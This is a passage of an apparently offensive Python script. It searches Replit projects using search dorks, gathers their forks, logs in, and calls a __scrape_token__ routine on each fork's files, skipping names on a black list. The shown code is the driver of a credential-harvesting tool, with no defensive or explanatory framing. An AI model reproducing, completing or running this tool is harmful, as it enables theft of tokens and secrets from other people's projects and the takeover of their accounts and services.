            ultimate.__search__(search_term, all=False if input(f"[{blue()}!{reset()}] Search only recent projects? {yellow()}y/n{reset()} > ").lower() == "y" else True);
        else:
            ultimate.__dorks_repls__(search_term); ultimate.__search__(search_term, all=False if input(f"[{blue()}!{reset()}] Search only recent projects? {yellow()}y/n{reset()} > ").lower() == "y" else True);
    for url in ultimate.results:
        ultimate.__fetch_forks__(url);
    ultimate.__login__();
    for fork in ultimate.forks:
        if fork.split("/")[len(fork.split("/"))-1] in ultimate.black_list:
            print("'%s' is black listed, skipping.." % fork);
        else:
            ultimate.__scrape_token__(fork, ultimate.__get_files__(fork));